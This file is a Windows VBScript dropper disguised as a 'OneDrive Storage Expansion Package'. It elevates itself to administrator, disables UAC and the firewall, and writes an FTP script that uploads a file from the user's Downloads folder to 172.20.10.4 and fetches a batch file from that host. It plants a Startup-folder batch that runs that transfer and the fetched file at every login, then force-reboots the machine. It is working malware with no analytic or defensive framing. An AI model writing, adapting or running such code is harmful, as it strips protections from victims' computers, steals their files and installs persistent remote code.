Sub RunAsAdmin()
  If WScript.Arguments.length = 0 Then
    CreateObject("Shell.Application").ShellExecute "WScript.exe", """" & _ 
    WScript.ScriptFullName & """ AdminArg", "", "runas", 1
    WScript.Quit    
  End If
End Sub : RunAsAdmin()

Dim objWMIService, colProcessList, objProcess
Set objShell = CreateObject("WScript.Shell")
objShell.Run "CMD /K"
WScript.Sleep(500)
objShell.Sendkeys "@echo off"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd\"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd {%}Userprofile{%}"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "Title OneDrive Storage Expansion Package v0.2.1.5.3.4"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "C:\Windows\System32\cmd.exe /k {%}windir{%}\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "netsh advfirewall set  currentprofile state off"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "DISM /online /enable-feature /featurename:TFTP"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo open 172.20.10.4 >Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo Microsoft_OneDrive>>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo LOADING...>>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo lcd {%}Userprofile{%}\Downloads>>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo get One_Drive_Expansion_Package.bat>>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo put {%}Userprofile{%}\Downloads\Digest.txt>>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo bye >>Loading_OneDrive_Account_Settings.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd\"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd {%}Userprofile{%}"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd AppData"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Roaming"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Microsoft"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Windows"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Start Menu"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Programs"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "cd Startup"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo @echo off >Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo Title Microsoft OneDrive >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo netstat >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo ftp -s:{%}Userprofile{%}\Loading_OneDrive_Account_Settings.bat >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo cd\ >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo cd {%}Userprofile{%} >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo cd Downloads >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo start One_Drive_Expansion_Package.bat>>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo pause >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(500)
objShell.Sendkeys "echo TASKKILL /F /IM cmd.exe >>Expansion_Package.bat"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"
WScript.Sleep(555)
objShell.Sendkeys "shutdown /r /f /t 0"
WScript.Sleep(500)
objShell.Sendkeys "{ENTER}"

